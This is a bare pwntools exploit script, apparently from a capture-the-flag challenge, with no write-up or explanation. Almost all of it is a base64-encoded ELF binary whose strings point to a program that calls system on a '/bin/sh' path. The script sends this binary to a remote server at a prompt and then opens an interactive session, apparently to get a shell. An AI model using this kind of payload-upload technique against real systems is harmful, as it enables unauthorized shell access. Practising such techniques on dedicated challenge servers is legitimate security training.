from pwn import *

bin = "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AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAABABgAAAAAAAAAGAAAAAAAAAQAAAAAAAAABAAAAAAAAAAwAAAAAAAAA8AQAAAAAAAANAAAAAAAAAOQGAAAAAAAAGQAAAAAAAAC4DSAAAAAAABsAAAAAAAAACAAAAAAAAAAaAAAAAAAAAMANIAAAAAAAHAAAAAAAAAAIAAAAAAAAAPX+/28AAAAAmAIAAAAAAAAFAAAAAAAAAGADAAAAAAAABgAAAAAAAAC4AgAAAAAAAAoAAAAAAAAAhAAAAAAAAAALAAAAAAAAABgAAAAAAAAAFQAAAAAAAAAAAAAAAAAAAAMAAAAAAAAAuA8gAAAAAAACAAAAAAAAABgAAAAAAAAAFAAAAAAAAAAHAAAAAAAAABcAAAAAAAAA2AQAAAAAAAAHAAAAAAAAABgEAAAAAAAACAAAAAAAAADAAAAAAAAAAAkAAAAAAAAAGAAAAAAAAAAeAAAAAAAAAAgAAAAAAAAA+///bwAAAAABAAAIAAAAAP7//28AAAAA+AMAAAAAAAD///9vAAAAAAEAAAAAAAAA8P//bwAAAADkAwAAAAAAAPn//28AAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAMgNIAAAAAAAAAAAAAAAAAAAAAAAAAAAACYFAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAACBAgAAAAAABHQ0M6IChVYnVudHUgNy41LjAtM3VidW50dTF+MTguMDQpIDcuNS4wAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAwABADgCAAAAAAAAAAAAAAAAAAAAAAAAAwACAFQCAAAAAAAAAAAAAAAAAAAAAAAAAwADAHQCAAAAAAAAAAAAAAAAAAAAAAAAAwAEAJgCAAAAAAAAAAAAAAAAAAAAAAAAAwAFALgCAAAAAAAAAAAAAAAAAAAAAAAAAwAGAGADAAAAAAAAAAAAAAAAAAAAAAAAAwAHAOQDAAAAAAAAAAAAAAAAAAAAAAAAAwAIAPgDAAAAAAAAAAAAAAAAAAAAAAAAAwAJABgEAAAAAAAAAAAAAAAAAAAAAAAAAwAKANgEAAAAAAAAAAAAAAAAAAAAAAAAAwALAPAEAAAAAAAAAAAAAAAAAAAAAAAAAwAMABAFAAAAAAAAAAAAAAAAAAAAAAAAAwANADAFAAAAAAAAAAAAAAAAAAAAAAAAAwAOAEAFAAAAAAAAAAAAAAAAAAAAAAAAAwAPAOQGAAAAAAAAAAAAAAAAAAAAAAAAAwAQAPAGAAAAAAAAAAAAAAAAAAAAAAAAAwARAAgHAAAAAAAAAAAAAAAAAAAAAAAAAwASAEgHAAAAAAAAAAAAAAAAAAAAAAAAAwATALgNIAAAAAAAAAAAAAAAAAAAAAAAAwAUAMANIAAAAAAAAAAAAAAAAAAAAAAAAwAVAMgNIAAAAAAAAAAAAAAAAAAAAAAAAwAWALgPIAAAAAAAAAAAAAAAAAAAAAAAAwAXAAAQIAAAAAAAAAAAAAAAAAAAAAAAAwAYABAQIAAAAAAAAAAAAAAAAAAAAAAAAwAZAAAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAAAMAAAAAgAOAHAFAAAAAAAAAAAAAAAAAAAOAAAAAgAOALAFAAAAAAAAAAAAAAAAAAAhAAAAAgAOAAAGAAAAAAAAAAAAAAAAAAA3AAAAAQAYABAQIAAAAAAAAQAAAAAAAABGAAAAAQAUAMANIAAAAAAAAAAAAAAAAABtAAAAAgAOAEAGAAAAAAAAAAAAAAAAAAB5AAAAAQATALgNIAAAAAAAAAAAAAAAAACYAAAABADx/wAAAAAAAAAAAAAAAAAAAAABAAAABADx/wAAAAAAAAAAAAAAAAAAAACgAAAAAQASAEwIAAAAAAAAAAAAAAAAAAAAAAAABADx/wAAAAAAAAAAAAAAAAAAAACuAAAAAAATAMANIAAAAAAAAAAAAAAAAAC/AAAAAQAVAMgNIAAAAAAAAAAAAAAAAADIAAAAAAATALgNIAAAAAAAAAAAAAAAAADbAAAAAAARAAgHAAAAAAAAAAAAAAAAAADuAAAAAQAWALgPIAAAAAAAAAAAAAAAAAAEAQAAEgAOAOAGAAAAAAAAAgAAAAAAAAAUAQAAIAAAAAAAAAAAAAAAAAAAAAAAAABsAQAAIAAXAAAQIAAAAAAAAAAAAAAAAAAwAQAAEAAXABAQIAAAAAAAAAAAAAAAAAAOAQAAEgAPAOQGAAAAAAAAAAAAAAAAAAA3AQAAEgAAAAAAAAAAAAAAAAAAAAAAAABLAQAAEgAAAAAAAAAAAAAAAAAAAAAAAABqAQAAEAAXAAAQIAAAAAAAAAAAAAAAAAB3AQAAIAAAAAAAAAAAAAAAAAAAAAAAAACGAQAAEQIXAAgQIAAAAAAAAAAAAAAAAACTAQAAEQAQAPAGAAAAAAAABAAAAAAAAACiAQAAEgAOAHAGAAAAAAAAZQAAAAAAAAC6AAAAEAAYABgQIAAAAAAAAAAAAAAAAABwAQAAEgAOAEAFAAAAAAAAKwAAAAAAAACyAQAAEAAYABAQIAAAAAAAAAAAAAAAAAC+AQAAEgAOAEoGAAAAAAAAFwAAAAAAAADDAQAAEQIXABAQIAAAAAAAAAAAAAAAAADPAQAAIAAAAAAAAAAAAAAAAAAAAAAAAADpAQAAIgAAAAAAAAAAAAAAAAAAAAAAAACsAQAAEgALAPAEAAAAAAAAAAAAAAAAAAAAY3J0c3R1ZmYuYwBkZXJlZ2lzdGVyX3RtX2Nsb25lcwBfX2RvX2dsb2JhbF9kdG9yc19hdXgAY29tcGxldGVkLjc2OTgAX19kb19nbG9iYWxfZHRvcnNfYXV4X2ZpbmlfYXJyYXlfZW50cnkAZnJhbWVfZHVtbXkAX19mcmFtZV9kdW1teV9pbml0X2FycmF5X2VudHJ5AGhlbGxvLmMAX19GUkFNRV9FTkRfXwBfX2luaXRfYXJyYXlfZW5kAF9EWU5BTUlDAF9faW5pdF9hcnJheV9zdGFydABfX0dOVV9FSF9GUkFNRV9IRFIAX0dMT0JBTF9PRkZTRVRfVEFCTEVfAF9fbGliY19jc3VfZmluaQBfSVRNX2RlcmVnaXN0ZXJUTUNsb25lVGFibGUAX2VkYXRhAHN5c3RlbUBAR0xJQkNfMi4yLjUAX19saWJjX3N0YXJ0X21haW5AQEdMSUJDXzIuMi41AF9fZGF0YV9zdGFydABfX2dtb25fc3RhcnRfXwBfX2Rzb19oYW5kbGUAX0lPX3N0ZGluX3VzZWQAX19saWJjX2NzdV9pbml0AF9fYnNzX3N0YXJ0AG1haW4AX19UTUNfRU5EX18AX0lUTV9yZWdpc3RlclRNQ2xvbmVUYWJsZQBfX2N4YV9maW5hbGl6ZUBAR0xJQkNfMi4yLjUAAC5zeW10YWIALnN0cnRhYgAuc2hzdHJ0YWIALmludGVycAAubm90ZS5BQkktdGFnAC5ub3RlLmdudS5idWlsZC1pZAAuZ251Lmhhc2gALmR5bnN5bQAuZHluc3RyAC5nbnUudmVyc2lvbgAuZ251LnZlcnNpb25fcgAucmVsYS5keW4ALnJlbGEucGx0AC5pbml0AC5wbHQuZ290AC50ZXh0AC5maW5pAC5yb2RhdGEALmVoX2ZyYW1lX2hkcgAuZWhfZnJhbWUALmluaXRfYXJyYXkALmZpbmlfYXJyYXkALmR5bmFtaWMALmRhdGEALmJzcwAuY29tbWVudAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAbAAAAAQAAAAIAAAAAAAAAOAIAAAAAAAA4AgAAAAAAABwAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAIwAAAAcAAAACAAAAAAAAAFQCAAAAAAAAVAIAAAAAAAAgAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAADEAAAAHAAAAAgAAAAAAAAB0AgAAAAAAAHQCAAAAAAAAJAAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAABEAAAA9v//bwIAAAAAAAAAmAIAAAAAAACYAgAAAAAAABwAAAAAAAAABQAAAAAAAAAIAAAAAAAAAAAAAAAAAAAATgAAAAsAAAACAAAAAAAAALgCAAAAAAAAuAIAAAAAAACoAAAAAAAAAAYAAAABAAAACAAAAAAAAAAYAAAAAAAAAFYAAAADAAAAAgAAAAAAAABgAwAAAAAAAGADAAAAAAAAhAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAABeAAAA////bwIAAAAAAAAA5AMAAAAAAADkAwAAAAAAAA4AAAAAAAAABQAAAAAAAAACAAAAAAAAAAIAAAAAAAAAawAAAP7//28CAAAAAAAAAPgDAAAAAAAA+AMAAAAAAAAgAAAAAAAAAAYAAAABAAAACAAAAAAAAAAAAAAAAAAAAHoAAAAEAAAAAgAAAAAAAAAYBAAAAAAAABgEAAAAAAAAwAAAAAAAAAAFAAAAAAAAAAgAAAAAAAAAGAAAAAAAAACEAAAABAAAAEIAAAAAAAAA2AQAAAAAAADYBAAAAAAAABgAAAAAAAAABQAAABYAAAAIAAAAAAAAABgAAAAAAAAAjgAAAAEAAAAGAAAAAAAAAPAEAAAAAAAA8AQAAAAAAAAXAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAIkAAAABAAAABgAAAAAAAAAQBQAAAAAAABAFAAAAAAAAIAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAACUAAAAAQAAAAYAAAAAAAAAMAUAAAAAAAAwBQAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAAnQAAAAEAAAAGAAAAAAAAAEAFAAAAAAAAQAUAAAAAAACiAQAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAKMAAAABAAAABgAAAAAAAADkBgAAAAAAAOQGAAAAAAAACQAAAAAAAAAAAAAAAAAAAAQAAAAAAAAAAAAAAAAAAACpAAAAAQAAAAIAAAAAAAAA8AYAAAAAAADwBgAAAAAAABUAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAAsQAAAAEAAAACAAAAAAAAAAgHAAAAAAAACAcAAAAAAAA8AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAAL8AAAABAAAAAgAAAAAAAABIBwAAAAAAAEgHAAAAAAAACAEAAAAAAAAAAAAAAAAAAAgAAAAAAAAAAAAAAAAAAADJAAAADgAAAAMAAAAAAAAAuA0gAAAAAAC4DQAAAAAAAAgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA1QAAAA8AAAADAAAAAAAAAMANIAAAAAAAwA0AAAAAAAAIAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAIAAAAAAAAAOEAAAAGAAAAAwAAAAAAAADIDSAAAAAAAMgNAAAAAAAA8AEAAAAAAAAGAAAAAAAAAAgAAAAAAAAAEAAAAAAAAACYAAAAAQAAAAMAAAAAAAAAuA8gAAAAAAC4DwAAAAAAAEgAAAAAAAAAAAAAAAAAAAAIAAAAAAAAAAgAAAAAAAAA6gAAAAEAAAADAAAAAAAAAAAQIAAAAAAAABAAAAAAAAAQAAAAAAAAAAAAAAAAAAAACAAAAAAAAAAAAAAAAAAAAPAAAAAIAAAAAwAAAAAAAAAQECAAAAAAABAQAAAAAAAACAAAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAD1AAAAAQAAADAAAAAAAAAAAAAAAAAAAAAQEAAAAAAAACkAAAAAAAAAAAAAAAAAAAABAAAAAAAAAAEAAAAAAAAAAQAAAAIAAAAAAAAAAAAAAAAAAAAAAAAAQBAAAAAAAADoBQAAAAAAABsAAAArAAAACAAAAAAAAAAYAAAAAAAAAAkAAAADAAAAAAAAAAAAAAAAAAAAAAAAACgWAAAAAAAABQIAAAAAAAAAAAAAAAAAAAEAAAAAAAAAAAAAAAAAAAARAAAAAwAAAAAAAAAAAAAAAAAAAAAAAAAtGAAAAAAAAP4AAAAAAAAAAAAAAAAAAAABAAAAAAAAAAAAAAAAAAAA"

p = remote("remote16.goatskin.kr", 63731)
context.log_level = "debug"

p.sendlineafter(": \n", bin)

p.interactive()
